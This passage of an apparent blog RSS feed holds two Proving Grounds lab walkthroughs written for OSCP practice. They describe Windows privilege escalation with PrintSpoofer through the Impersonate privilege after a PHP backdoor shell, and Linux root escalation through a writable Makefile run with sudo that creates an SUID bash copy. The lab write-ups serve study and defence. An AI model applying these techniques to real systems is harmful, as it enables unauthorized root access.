&lt;p&gt;The next rabbit hole was focusing on &lt;strong&gt;apache&amp;#39;s&lt;/strong&gt; Full Control permissions on the Apache service itself, &lt;code&gt;C:\xampp\apache\bin\httpd.exe&lt;/code&gt;. I had the same thought process from when I noticed the &lt;code&gt;ResumeService1&lt;/code&gt; service, only this time it wasn&amp;#39;t related to an unquoted path, but the ability overwrite the service executable itself. Then I realized I couldn&amp;#39;t overwrite a file currently being used by another process. Simple, I can just stop the service right?&lt;/p&gt;

&lt;p&gt;Nope. My user doesn&amp;#39;t have the required permissions to stop the service.&lt;/p&gt;

&lt;p&gt;Even if I could, I would likely cut off my current access because this shell resulted from a PHP backdoor located on the web server, and is therefore a child process of that service. This means there is a chance that the child process would also be killed, though there are exceptions in Windows. Regardless, overwriting the Apache executable is not an option.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_PrivEsc-Apache-Service-1.png&quot; alt=&quot;Priv Esc Apache Service 1&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_PrivEsc-Apache-Service-2.png&quot; alt=&quot;Priv Esc Apache Service 2&quot;&gt;&lt;/p&gt;

&lt;p&gt;Well I&amp;#39;ve laterally moved to a new user, what if I have new permissions? I listed them with &lt;code&gt;whoami /priv&lt;/code&gt; and immediately noticed the enabled Impersonate privilege. This privilege is likely vulnerable to the Potato family of exploits, RogueWinRM, or &lt;a href=&quot;https://github.com/itm4n/PrintSpoofer&quot;&gt;PrintSpoofer&lt;/a&gt;. I chose PrintSpoofer because the readme clearly states it is applicable to Windows Server 2019, which matches the target OS version.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_PrivEsc-Impersonate.png&quot; alt=&quot;PrivEsc Impersonate&quot;&gt;&lt;/p&gt;

&lt;p&gt;After downloading the PrintSpoofer exploit onto Kali, I served it using the same Python HTTP server as before and downloaded the executable onto the target with the &lt;code&gt;Invoke-WebRequest&lt;/code&gt; Cmdlet. Once downloaded, all that is left to do is to execute it with the following flags:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-i&lt;/code&gt;: Interact with the process in the current shell&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-c&lt;/code&gt;: Command to execute&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With a SYSTEM shell, I can now capture the proof flag and consider this machine rooted!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Proof.png&quot; alt=&quot;PrivEsc PrintSpoofer&quot;&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 30 Jul 2025 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/2025/PG-Craft-Walkthrough/</link>
        <guid isPermaLink="true">http://localhost:4000/2025/PG-Craft-Walkthrough/</guid>
        
        
      </item>
    
      <item>
        <title>Proving Grounds SPX: Privilege Escalation</title>
        <description>&lt;p&gt;As I progress through &lt;a href=&quot;https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview&quot;&gt;TJ Null&amp;#39;s OSCP PWK V3 list&lt;/a&gt;, I wanted to cover a particular machine that had a very unique privilege escalation vulnerability. The machine in question is SPX. I&amp;#39;ll skip over initial access for the sake of brevity and limiting spoilers. Speaking of spoilers, you&amp;#39;ve been warned!&lt;/p&gt;

&lt;h1&gt;Identifying the Vulnerability&lt;/h1&gt;

&lt;p&gt;Once I had my initial footfold into the machine, and gained access to a local user account, my immediate thought was:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;what privileges do I have in this new user context?&lt;/em&gt; &lt;/p&gt;

&lt;p&gt;After some manual enumeration, I eventually found the answer. A sudo command for the &lt;code&gt;make&lt;/code&gt; binary:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-SPX-PrivEsc_Sudo-Cmd.png&quot; alt=&quot;profiler sudo privileges&quot;&gt;&lt;/p&gt;

&lt;h2&gt;Research&lt;/h2&gt;

&lt;p&gt;Anytime I come across a specific Unix binary with special permissions (&lt;code&gt;sudo&lt;/code&gt; in this case), I always consult the &lt;a href=&quot;https://gtfobins.github.io/gtfobins/make/#sudo&quot;&gt;GTFOBins&lt;/a&gt; GitHub Pages site.&lt;/p&gt;

&lt;p&gt;Initially, it looked like I had an easy win here, but I do not have access to the &lt;code&gt;-s&lt;/code&gt; and &lt;code&gt;--eval&lt;/code&gt; flags shown in the example GTFOBins code snippet. The target&amp;#39;s whitelisted command from the &lt;code&gt;sudo -l&lt;/code&gt; output was &lt;code&gt;/usr/bin/make install -C /home/profiler/php-spx&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-SPX-PrivEsc_Make-GTFOBin.png&quot; alt=&quot;GTFOBin Research&quot;&gt;&lt;/p&gt;

&lt;p&gt;I&amp;#39;ll be honest, I was stumped on this problem for a good hour or so. I decided to thoroughly enumerate the rest of the system. I was convinced I missed something somewhere. Eventually, I realized the &lt;code&gt;sudo&lt;/code&gt; permission for this user was the obvious privilege escalation vulnerability. It was my only access to command execution as &lt;em&gt;root&lt;/em&gt; on the target.&lt;/p&gt;

&lt;h3&gt;Even More Research&lt;/h3&gt;

&lt;p&gt;Having used the &lt;code&gt;make&lt;/code&gt; utility in the past, I knew it called on instructions specified in a &lt;code&gt;Makefile&lt;/code&gt;. I searched for &lt;code&gt;Makefile&lt;/code&gt; exploits/privilege escalation techniques. Googling this topic eventually led me to this &lt;a href=&quot;https://medium.com/@adamforsythebartlett/makefile-privilege-escalation-oscp-62ea2c666d23&quot;&gt;Medium&lt;/a&gt; article, written by one Adam Bartlett. He explains that &lt;code&gt;make&lt;/code&gt; can be used to execute bash commands when the target directory is specified using the &lt;code&gt;-C&lt;/code&gt; flag.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The â€œmakeâ€ command looks for a file called â€œMakefileâ€. If youâ€™re looking for code execution, make sure youâ€™re running â€œmakeâ€ in the location where â€œMakefileâ€ is executed, or specify the directory using the -C flag.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here is the malicious syntax for bash execution provided in the article.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-SPX-PrivEsc_Make-Medium-Blog.png&quot; alt=&quot;Medium Article Example&quot;&gt;&lt;/p&gt;

&lt;h1&gt;Crafting the Makefile&lt;/h1&gt;

&lt;p&gt;Now it&amp;#39;s time to match the example to the target system. I always like to start by making a backup of a file I&amp;#39;m modifying. It&amp;#39;s not a requirement by any means, but it&amp;#39;s a good habit to have.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;profiler@spx:/var/www/html$ cd ~/php-spx/
profiler@spx:~/php-spx$ cp Makefile ./Makefile.bak
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There&amp;#39;s many different bash techniques that can be used to spawn a &lt;em&gt;root&lt;/em&gt; shell in this scenario. I chose to create a malicous copy of bash with an SUID bit. When a standard user executes this bash copy with a &lt;code&gt;-p&lt;/code&gt; flag, it tells bash to not reset the effective user ID with my real user ID. In short, bash will run with the file owner&amp;#39;s permissions (&lt;em&gt;root&lt;/em&gt;).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-SPX-PrivEsc_New-Makefile.png&quot; alt=&quot;Malicious Makefile&quot;&gt;&lt;/p&gt;

&lt;h1&gt;Escalating Privileges&lt;/h1&gt;

&lt;p&gt;With the malicious &lt;code&gt;Makefile&lt;/code&gt; in place, it&amp;#39;s simply a matter of executing the allowed &lt;code&gt;sudo&lt;/code&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-SPX-PrivEsc_Sudo-Make-Exploit.png&quot; alt=&quot;Sudo Make Exploit&quot;&gt;&lt;/p&gt;

&lt;p&gt;Now I&amp;#39;ll execute the new &lt;code&gt;/tmp/evil&lt;/code&gt; bash binary, ensuring the &lt;code&gt;-p&lt;/code&gt; flag is provided to spawn a &lt;em&gt;root&lt;/em&gt; shell!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-SPX-PrivEsc_Bash-Privilege-Escalation.png&quot; alt=&quot;Evil Bash Binary&quot;&gt;&lt;/p&gt;

&lt;h1&gt;Lessons Learned&lt;/h1&gt;

&lt;p&gt;The very specific &lt;code&gt;sudo&lt;/code&gt; command was a great starting point for securing the system, but the true vulnerability lies in the specified directory&amp;#39;s permissions, &lt;code&gt;/home/profiler/php-spx&lt;/code&gt;. The standard user &lt;em&gt;profiler&lt;/em&gt; had &lt;strong&gt;write&lt;/strong&gt; access to the directory, and as a result, write access to the &lt;code&gt;Makefile&lt;/code&gt; itself. If the directory prevented the &lt;em&gt;profiler&lt;/em&gt; user from having write access, there would be no opportunity to escalate privileges.&lt;/p&gt;

&lt;p&gt;This machine was an excellent reminder that the devil is always in the details, and file permissions matter!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-SPX-PrivEsc_Lessons-Learned.png&quot; alt=&quot;Lessons Learned&quot;&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 07 Jul 2025 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/2025/PG-SPX-PrivEsc/</link>
        <guid isPermaLink="true">http://localhost:4000/2025/PG-SPX-PrivEsc/</guid>
        
        
      </item>
    
  </channel>
</rss>
